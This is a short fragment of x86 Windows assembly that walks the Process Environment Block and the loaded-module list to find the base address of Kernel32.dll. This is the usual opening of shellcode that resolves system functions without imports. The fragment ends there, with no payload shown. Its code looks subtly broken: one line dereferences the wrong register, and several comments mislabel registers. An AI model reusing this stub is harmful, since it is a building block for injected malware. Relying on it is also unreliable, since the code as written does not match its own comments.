global _start

    section .text

        _start:

            xor ecx, ecx                        ; EAX = 0
            mov eax, fs:[ecx + 0x30]            ; load PEB (Process Environment Block) in EAX
            mov eax, [eax + 0x0c]               ; EAX = PEB -> LDR
            mov esi, [esi + 0x14]               ; EAX = PEB -> LDR.InMemoryOrderModuleList
            lodsd                               ; EAX = 2nd module of InMemoryOrderModuleList
            xchg eax, esi                       ; EAX = ESI, ESI = EAX
            lodsd                               ; EAX = 3rd module of InMemoryOrderModuleList
            xchg eax, esi                       ; EAX = ESI, ESI = EAX
            lodsd                               ; EAX = 4th module of InMemoryOrderModuleList
            mov ebx, [eax + 0x10]               ; EBX = Base Address of Kernel32.dll